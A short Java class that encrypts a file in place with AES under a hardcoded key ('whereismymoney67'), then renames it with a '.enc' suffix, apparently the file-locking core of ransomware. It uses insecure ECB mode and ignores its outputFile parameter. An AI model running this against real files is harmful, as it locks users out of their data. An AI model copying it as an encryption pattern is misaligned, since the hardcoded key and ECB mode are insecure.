import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.nio.file.Files;
import java.nio.file.Path;

public class EncryptFile {

    private static final byte[] keyBytes = "whereismymoney67".getBytes();
    private static final SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");

    public static void encrypt(Path inputFile, Path outputFile) throws Exception {

        if(inputFile.toString().endsWith(".enc")) {
            return;
        }

        byte[] fileData = Files.readAllBytes(inputFile);

        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key);

        byte[] encryptedData = cipher.doFinal(fileData);
        
        Files.write(inputFile, encryptedData);

        Path encFile = inputFile.resolveSibling(inputFile.getFileName().toString() + ".enc");
        Files.move(inputFile, encFile);
    }
}